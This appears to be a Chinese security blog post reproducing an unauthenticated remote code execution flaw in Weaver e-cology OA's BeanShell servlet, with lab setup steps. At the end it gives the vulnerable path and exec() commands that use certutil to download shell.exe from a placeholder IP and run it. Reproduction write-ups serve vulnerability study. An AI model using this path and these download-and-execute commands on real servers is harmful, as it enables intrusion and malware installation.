---
layout:     post
title:      【漏洞复现】泛微 e-cology OA 远程代码执行漏洞
subtitle:   远程代码执行漏洞
date:       2020-10-16
author:     matrix
header-img: img/websecurity.jpeg
catalog: true
tags:
    - 漏洞复现 
---

## 0x00 漏洞说明
2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁，泛微e-cology OA系统的J**A Beanshell接口可被未授权访问，攻击者调用该Beanshell接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行，漏洞等级严重。
## 0x01 影响版本
e-cology <=9.0
## 0x02 复现环境
Windows Server 2012
SQL Server 2012
Ecology8
## 0x03 漏洞复现
### 0、安装NetFx3
https://blog.csdn.net/F12138_/article/details/80220698
### 1、安装SQL Server 2012
如何安装：https://jingyan.baidu.com/article/6079ad0e39c32268ff86db93.html
### 2、安装泛微OA
相关的安装包和文档在这里：https://pan.baidu.com/s/1co--qbqBR_2-bqcRWtfOtg
### 3、漏洞利用
#### 命令执行
直接在网站根目录后加入组件访问路径 /weaver/bsh.servlet.BshServlet/

访问后直接在 Script 处输入Java代码点击 Evaluate 即可触发漏洞，并可以在Script Output处看到回显
![-w913](/img/16027836924596.jpg)
#### 下载木马并执行
exec("cmd /c certutil -urlcache -split -f http://xxx.xxx.xxx.xxx/shell.exe")
exec("cmd /c ./shell.exe")

